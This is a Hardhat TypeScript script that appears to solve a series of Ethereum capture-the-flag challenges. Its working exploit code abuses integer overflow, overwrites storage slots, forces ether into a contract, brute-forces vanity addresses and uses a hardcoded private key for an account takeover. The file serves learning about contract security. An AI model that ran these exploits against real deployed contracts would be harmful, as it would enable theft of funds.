import { ethers as het } from "hardhat";
import * as ethers from 'ethers'
import { BN } from 'bn.js'

const eut = ethers.utils

let signer: any
let one_eth = ethers.utils.parseEther('1.0')
const abiCoder = new ethers.utils.AbiCoder();

function right_pad(b: Buffer, len: number, char = '\x00') {
	let newb = Buffer.alloc(len, b)
	return newb.fill(char, b.length, len)
}

async function step(desc: string, promise: Promise<any>) {
	console.log('\x1B[1;32m', desc, '\x1B[0m : ') 
	let res = await promise
	console.log('   # ', res.hash)
	// auto-wait on transactions
	if (res.wait) res = await res.wait()
	console.log('   > ', res)
	return res
}

// @param mapSlot ethers.BigNumber
async function getMappingAtAddress(contract: string, mapSlot: any, at: String) {
    return await het.provider.getStorageAt(contract, 
                    ethers.utils.keccak256(abiCoder.encode(
                     ['address', 'uint256'],
                     [at, ethers.BigNumber.from(mapSlot)]
              ))
    )
}

async function setNickname() {
	let contract = new ethers.Contract(
		'0x71c46Ed333C35e4E6c62D32dc7C8F00D125b4fee',
		[
			'function setNickname(bytes32 nickname) public'
		], signer
	)
	await contract.setNickname(right_pad(Buffer.from('quiark'), 32))
}

async function guessNumber() {
    let contract = new ethers.Contract(
        '0x2a359FA5f7cB00E100e972315426Df2DeB77906e',
        [
            'function guess(uint8 n) public payable'
        ], signer
    )
	await contract.guess(42, { value: ethers.utils.parseEther('1.0') })
	return contract
}

async function guessSecretNumber() {
	/* notes
	 * my addr: 0x86a0...
	 * deploying challanges
	 *		fn selector:	0x6ad4e87a
	 *		contract:		0x71c46ed333c35e4e6c62d32dc7c8f00d125b4fee
	 *		arguments:		challenge id
	 * guess function:
	 *		fn selector:	0x4ba4c16b (probably)
	 */
	let contract = new ethers.Contract(
		'0x233De54C8bd04bcC1BF6AC2d244dc3d5ae54bc18',
		[
			'function guess(uint8 n) public payable'
		], signer
	)
	let tx = await contract.guess(170, { value: ethers.utils.parseEther('1.0') })
	console.log(tx)
	return contract
}

async function guessRandomNumber() {
    let blockNumber = 12846309
    let timestamp = 1661233536
    let prevBlockHash = '0x5fd2ec6c4ae9dce84b5b4178636c3b50fa882f3ba423015af80cb64f2e47258a'

    let contract = new ethers.Contract(
		'0xBd9399Fe56F9aC2Fdca5BE869a8b3C47d4010f30',
		[
			'function guess(uint8 n) public payable',
			'function isComplete() public view returns (bool)' 
		], signer
	)
	/*
	for (var ix = 0; ix < 10; ix++) {
		console.log('storage slot ', ix, 
			await ethers.provider.getStorageAt(contract.address, ix))
	}
	*/
	console.log('storage slot 0 ', await het.provider.getStorageAt(contract.address, 0))
	let tx = await contract.guess(
		0xb5,
		{ value: ethers.utils.parseEther('1.0') })

	console.log(tx)
	return contract
}

async function guessNewNumber() {
	let contract = new ethers.Contract(
		'0xfd4Aa751C7083F444eBF07822a3Ad98a97c40Cba',
		[
			'function guess(uint8 n) public payable',
			'function isComplete() public view returns (bool)' 
		], signer
	)

	let blockNumber = 10
	let now = 300
	// umm forget about predicting the value, let's just enumerate, shall we
	//let gas = await contract.estimateGas.guess(1, { value: one_eth })
	//console.log(gas)
	var nonce = await signer.getTransactionCount()

	for (let ix = 0; ix < 256; ix ++) {
		console.log('doing index ', ix)
		await contract.guess(ix, {
			value: one_eth,
			gasLimit: 31629,
			nonce: nonce
		})

		nonce += 1
	}

	return contract
}

async function attackNewNumber() {
	let target = new ethers.Contract(
		'0xfd4Aa751C7083F444eBF07822a3Ad98a97c40Cba',
		[
			'function guess(uint8 n) public payable',
            'function isComplete() public view returns (bool)' 
        ], signer
    )
    let attackFactory = await het.getContractFactory('AttackNewNumber')
    let attack = await attackFactory.deploy(target.address)
    //let attack = attackFactory.attach('0xA25b90b7Ee6BaB71e25F80cd75CF7EAAF02Bc2E8')
    console.log('attecker deployed at ', attack.address)
    console.log('target bal before attack: ', 
                await het.provider.getBalance(target.address))
	for (var ix = 0; ix < 7; ix++) {
		let tx = await attack.attempt(31, { gasLimit: 150_000, value: one_eth })
        console.log(tx.hash)
    }
    return target
}

async function predictFutureChallenge() {
    let target = new ethers.Contract(
		'0xf557bcee726Ede3Dea255Ff20f73CCc20127C4E5',
		[
			'function guess(uint8 n) public payable',
            'function isComplete() public view returns (bool)'
        ], signer
    )

	let attackFactory = await het.getContractFactory('AttackTheFuture')
	//let attack = await attackFactory.deploy(target.address, { value: one_eth })
    let attack = attackFactory.attach('0x42a70530757074ad9bDc3E68Eda2985f9e330B7f')
    console.log('attecker deployed at ', attack.address)
	while (!await target.isComplete()) {
		let tx = await attack.attempt({ gasLimit: 150_000 })
		console.log(tx.hash)
	}
	await attack.withdraw();
	return target
}

async function predictBlockHashChallenge() {
    let target = new ethers.Contract(      
		'0x1D5641C9d03fa48b839A09C035cB103c38178E78',
		[
            'function isComplete() public view returns (bool)',
			'function lockInGuess(bytes32 hash) public payable',
			'function settle() public'
        ], signer
    )
	//let tx = await target.lockInGuess(Buffer.alloc(32, 0), { value: one_eth })
	let tx = await target.settle();
	console.log(tx)


	return null
}

async function tokenSaleChallenge() {
	//let factory = await ethers.getContractFactory('TokenSaleChallenge')
	//let localChallenge = await factory.deploy(signer.address, { value: one_eth })
    let target = new ethers.Contract(
		'0x82ed8f5066dA4C371eE683C77c424e83188c7b8B',
		//localChallenge.address,
		[
            'function isComplete() public view returns (bool)',
			'function buy(uint256 numTokens) public payable',
			'function sell(uint256 numTokens) public'
        ], signer
    )
	// it's overflow game
	// e = one_eth
	// mask = 2^255
	// x, y, z = unknown
	// y - being passed in
	// x - maybe can fix it at 1
	// z - anything
	// (e * x) + mask*z = e * y
	//    ^ -- small number 
	//     very big number -^
	//    <=>
	// e * x = e * y (mod mask)
	//
	// special case
	//	e * 1 = e * y (mod mask)
	//	e = e * y (mod mask)
	//	   <=>
	//	e + mask*z == e * y   // -e
	//	(1) mask * z == e * (y - 1)
	//	z == e * (y - 1) / mask
	//
	//	let l = lcm(mask, e)
	//  let z = l / mask
	//  let y = 1 + (l / e)
	//    
	//
	//
	//let goalNumber = ethers.BigNumber.from('0x0000000000000000000000000000000000000000000000000000000000000000')
	let z = ethers.BigNumber.from('200000000000000000')
	let y = ethers.BigNumber.from('0x3333333333333333333333333333333333333333333333333333333333333334')
	// somehow my calculations are off by 2*10^x but it can still work
	//await step('overflowing buy', target.buy(y, { value: ethers.BigNumber.from('800000000000000000'), gasLimit: 200_000 }))
	/*
numTokens			23158417847463239084714197001737581570653996933128112807891516801582625927988
 msg.value			1000000000000000000
 multiple			800000000000000000
 price per token	1000000000000000000
 */

	const abiCoder = new ethers.utils.AbiCoder();
	console.log(await het.provider.getStorageAt(target.address, 
				 ethers.utils.keccak256(abiCoder.encode(
					 ['address', 'uint256'],
					 [signer.address, ethers.BigNumber.from(0)]))
	  ))
					 /*
					 Buffer.from(
						 '0x000000000000000000000000' + 
						 signer.address.substring(2) + 
						 '00'
					 , 'hex'))))
				 */
	let before = await het.provider.getBalance(signer.address)
	await step('selling something to get cash', target.sell(2))
	let after = await het.provider.getBalance(signer.address)
	console.log({gained : after.sub(before),
			   before: before.toString(),
			   after: after.toString()})
}

async function tokenWhaleChallenge() {
    let target = new ethers.Contract(
		'0x0ED3a022D58803390ffD4e2c47983f52729C46C9',
		[
            'function isComplete() public view returns (bool)',
			'function transfer(address to, uint256 value) public',
			'function approve(address spender, uint256 value) public',
			'function transferFrom(address from, address to, uint256 value) public'
        ], signer
    )

	let friend = (await het.getSigners())[1]
	let passerby = (await het.getSigners())[2]
	console.log('friend (pls fund): ', friend.address, ' balance ', await het.provider.getBalance(friend.address))
	if ((await het.provider.getBalance(friend.address)).isZero()) {
		await signer.sendTransaction({ to: friend.address, value: one_eth.mul(2) })
	}

	console.log('signer balance', await getMappingAtAddress(target.address, 2, signer.address))

	// allowance : victim -> spender -> amount
	/*
	await step('a friend approves',
			   target.connect(signer)
			   .approve(
				   friend.address,
                   ethers.BigNumber.from('0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff')))
    await step('transferFrom friend',
               target.connect(friend)
               .transferFrom(
                   signer.address,
				   passerby.address,
                   1000,
				   { gasLimit: 200_000 }))
   */
	await step('whale friend now gives something to signer',
			   target.connect(friend)
				.transfer(signer.address, 8_000_000_000))
	console.log('friend balance', await getMappingAtAddress(target.address, 2, friend.address))
	console.log('passerby balance:', await getMappingAtAddress(target.address, 2, passerby.address))
    return target
}

async function retirementFundChallenge() {
    let target = new ethers.Contract(
		'0xDd0DB72C1fdC774D6Cd8142aeAfeDe8E9fae9B1E',
		[
            'function isComplete() public view returns (bool)',
			'function collectPenalty() public'
        ], signer
    )
	let kamikazeFactory = await het.getContractFactory('Kamikaze')
	let kamikaze = await kamikazeFactory.deploy({ value: one_eth.mul(3) })

	await step('overfund', kamikaze.bye(target.address))
	await step('withdraw', target.collectPenalty({ gasLimit: 500_000 }))
	return target
}

async function mappingChallenge() {
    let target = new ethers.Contract(
		'0x9A18c3F06023dc7d071DCF8840EeF9320609d5e0',
		[
            'function isComplete() public view returns (bool)',
			'function set(uint256 key, uint256 value) public ',
			'function get(uint256 key) public view returns (uint256)'
        ], signer
    )
	const abiCoder = new ethers.utils.AbiCoder();
	await target.set(0, 0xbabe)
	await target.set(1, 0xb00b)
	await target.set(2, 0xcafe)
	let firstSlot = ethers.BigNumber.from(ethers.utils.keccak256(abiCoder.encode(
		['uint256'], [1]
	)))
	let complSlot = ethers.BigNumber.from(2).pow(256).sub(firstSlot)
	await target.set(complSlot, 1)
	// 0 :: isComplete slot
	// 1 :: map slot 
	console.log(await het.provider.getStorageAt(target.address, 0))
	console.log(await het.provider.getStorageAt(target.address, 1))
	console.log(await het.provider.getStorageAt(target.address, firstSlot))
	console.log(await het.provider.getStorageAt(target.address, firstSlot.add(1)))
	return target
}

async function donationChallenge() {
    let target = new ethers.Contract(
		'0xf739eBB6EE753A479c8250eeCAfBFFc133Aef421',
		[
            'function isComplete() public view returns (bool)',
			'function donate(uint256 etherAmount) public payable',
			'function withdraw() public' 
        ], signer
    )

	await step('overwriting owner', target.donate(
		signer.address, { 
			value: ethers.BigNumber.from(signer.address).div(
				ethers.BigNumber.from(10).pow(36)),
			gasLimit: 500_000
	}))
	await step('withdraw', target.withdraw())

	return target
}

async function measurements() {
	let measureFactory = await het.getContractFactory('Measure')
	let measure = await measureFactory.deploy()

	//await measure.show();
	await measure.save(0)
	await measure.save(2)
	await measure.save(1)
	await measure.save(3)
	console.log(await measure.getQueue(0))
	console.log(await measure.getQueue(1))
	console.log(await measure.getQueue(2))
	console.log(await measure.getQueue(3))
	console.log('length', await het.provider.getStorageAt(measure.address, 0))
	console.log(await het.provider.getStorageAt(measure.address,
						   ethers.utils.keccak256(abiCoder.encode(
							   ['uint256'], [0]))))
}

async function fiftyYears() {
	let target = new ethers.Contract(
		'0x820C7Bf576bCBf276f610C8Ed2CaE2b5B489C88E',
		[
            'function isComplete() public view returns (bool)',
			'function upsert(uint256 index, uint256 timestamp) public payable',
			'function withdraw(uint256 index) public'
        ], signer
	)

	/*
	let factory = await ethers.getContractFactory('FiftyYearsChallenge')
	let deployed = await factory.deploy(signer.address, { value: one_eth })
	target = deployed
	*/

	// first upsert code walk (index == 0)
	//	upsert(0, ts)
	//		TRUE: index >= head && index < queue.length
	//			update queue[0]
	// first upsert (index == 1)
	//	upsert(1, ts)
	//		FALSE: index < queue.length
	//			ts >= queue[0].unlockTimestamp + 1 days
	//			overwrite queue.length with msg.value
	//			overwrite head with timestamp
	// step 2
	//	upsert()
	
	async function dumpStorage() {
		console.log('[0] queue.length:', await het.provider.getStorageAt(target.address, 0))
		console.log('[1] head        :', await het.provider.getStorageAt(target.address, 1))
		let start = ethers.BigNumber.from(ethers.utils.keccak256(abiCoder.encode(
			['uint256'], [0])))
		for (let ix = 0; ix < 4; ix++) {
			console.log('queue[',ix,'].amount:', await het.provider.getStorageAt(target.address, start.add(ix * 2 + 0)))
			console.log('queue[',ix,'].timest:', await het.provider.getStorageAt(target.address, start.add(ix * 2 + 1)))
		}
	}
	
	// process A
	if (true) {
		let one_days = 24 * 60 * 60
		console.log('starting balance:', await het.provider.getBalance(target.address))
		await step('step 1', target.upsert(
					100, 
					801002003004,
					{ value: 1 }))
		await step('step 5', target.upsert(
					200, 
					802002003004,
					{ value: 1 }))
		await step('step 10', target.upsert(
					300, 
					ethers.BigNumber.from(2).pow(256).sub(one_days), 
					{ value: 1 }))
			// queue.length == 1
			// head == -1 day
			// queue[1] = { 1, -one_days }
		await step('step 20', target.upsert(
					400,
					0,
					{ value: 3 }))
			// queue.length == 3
			// head == 0
			// queue[1] = { 3, 0 }
		await dumpStorage()
		await step('step 30', target.withdraw(3, { gasLimit: 500_000 }))
		console.log('final balance:', await het.provider.getBalance(target.address))
	}

	// alternative process B
	if (false) {
		await step('step 1', target.upsert(1, '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff', { value: 100 }))
			// after, head == uint256(-1)
			// queue.length == 100
	}
	return target
}

class MadeUpSigningKeySearch extends ethers.utils.SigningKey {
	signDigest(digest: ethers.utils.BytesLike) {
		let batch = process.env.BATCH
		let ok = 0
		let fail = 0
		console.log(batch)
		for (let ix = 0; ix < 0xff00ff00ff; ix++) {
			let signature = {
				recoveryParam: 0,
				r: ethers.utils.hexZeroPad("0x" + ix.toString(), 32),
				s: ethers.utils.hexZeroPad("0x" + batch + "00deadbeefcafebabe", 32),
			}

			try {
				let addr = ethers.utils.recoverAddress(digest, signature)
				if (addr.toLowerCase().includes('badc0de')) {
					console.log(ix, addr, batch)
					console.log(signature)
					return ethers.utils.splitSignature(signature)
				}
				ok++
			} catch (e) { fail++ }
			if (ix % 50_000 == 0) console.log('.', ix)
		}
		throw new Error('not found')
	}

}

class MadeUpSigningKey extends ethers.utils.SigningKey {
	signDigest(digest: ethers.utils.BytesLike) {
		return ethers.utils.splitSignature(
		{
			recoveryParam: 0,
			r: '0x0000000000000000000000000000000000000000000000000000000001961041',
			s: '0x000000000000000000000000000000000000000000022200deadbeefcafebabe'
		})
	}

}

async function fuzzyIdentity() {
	let target = new ethers.Contract(
		'0x40BE4B3970A454E676fd7AEa57AA4B3c4c8DA6aF',
		[
			'function isComplete() public view returns (bool)',
		], signer
	)


	/*
	 * Ooops, implemented the wrong kind of bruteforcing
	 *
	let walletFactory = await het.getContractFactory('PersonalWallet')
	let deploytx = walletFactory.getDeployTransaction()
	let signingkey = new MadeUpSigningKey('0xabababababababababababababababababababababababababababababababab')
	let wallet = new ethers.Wallet(signingkey)
	await het.provider.sendTransaction(await wallet.signTransaction(deploytx))
	*/

	if (false) { // done
		let ix =  1
		while (ix != 0) {
			let wallet = new ethers.Wallet(ethers.utils.hexZeroPad('0x' + ix, 32))
			let addr = ethers.utils.getContractAddress({ from: wallet.address, nonce: 0 })

			if (addr.toLowerCase().includes('badc0de')) {
				console.log(addr, ix, wallet.privateKey)
				break                           
			}                                   

			if (ix % 10_000 == 0) console.log('. ', ix)
				ix ++                               

		}
	} else {
		let ix = 4552012
		let wallet = new ethers.Wallet(ethers.utils.hexZeroPad('0x' + ix, 32), het.provider)
		let walletFactory = await het.getContractFactory('PersonalWallet', {
			signer: wallet, provider: het.provider
		})

		//await step('prefund', signer.sendTransaction({ to: wallet.address, value: one_eth.mul(5).div(10), gasLimit: 100_000 }))
		//await step('deploy', het.provider.sendTransaction(await wallet.signTransaction(deploytx)))
		//await step('deploy', walletFactory.deploy())
		await step('auth', walletFactory.attach('0x74C142B55814A770BAdC0DE9995A5f42aaA22E51').auth(target.address, { gasLimit: 500_000 }))
	}

	return target
}

async function publicKeyChallenge() {
	let tx = '0xabc467bedd1d17462fcc7942d0af7874d6f8bdefee2b299c9168a216d3ff0edb'

	let target = new ethers.Contract(
		'0x2BaAEE4cE5f6ABFA336fBF93f3Dc67099A17903b',
		[
			'function isComplete() public view returns (bool)',
			'function authenticate(bytes publicKey) public'
		], signer
	)

	let txobj = await het.provider.getTransaction(tx) as any
	let from = txobj.from

	function getTxDigest(tx: any) {
		let txobj = Object.assign({}, tx)
		let sig = {
			r: txobj.r as string,
			s: txobj.s,
			v: txobj.v
		}
		delete txobj.s
		delete txobj.r
		delete txobj.v
		delete txobj.from
		delete txobj.wait
		delete txobj.creates
		delete txobj.hash
		delete txobj.accessList
		delete txobj.blockHash
		delete txobj.blockNumber
		delete txobj.transactionIndex
		delete txobj.confirmations

		let digest = ethers.utils.keccak256(ethers.utils.serializeTransaction(txobj))
		return digest
	}

	let digest = getTxDigest(txobj)

	let pubkey = ethers.utils.recoverPublicKey(digest, txobj)
	let addr = eut.recoverAddress(digest, txobj)
	console.log({
		pubkey,
		digest,
		tx,
		hash_pubkey: eut.keccak256(pubkey),
		sol_hash_pubkey: eut.solidityKeccak256(['bytes'], [pubkey]),
		addr
	})
	step('auth', target.authenticate(eut.hexDataSlice(pubkey, 1), { gasLimit: 400_000 }))
	return target
}

async function accountTakeover() {
	let wallet = new ethers.Wallet('0x614f5e36cd55ddab0947d1723693fef5456e5bee24738ba90bd33c0c6e68e269', het.provider)
	let target = new ethers.Contract(
		'0xCe8Ec74Ef059F44970fD3eB113e6aDc4cC14CD80',
		[
			'function isComplete() public view returns (bool)',
			'function authenticate() public'
		], wallet
	)
	await target.authenticate()
}

async function main() {
	signer = (await het.getSigners())[0];

	let contract = await accountTakeover()

	/*
	let challenge = new ethers.Contract(
		'0xBB1a1D6fCef0D50c71d599C58e84718e8a7E84ef',
		[ 'function isComplete() public view returns (bool)' ],
		signer
	)
	*/
    if (contract != null) {
		console.log('complete:', await (contract as any).isComplete())
	}
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
	console.error(error);
	process.exitCode = 1;
});
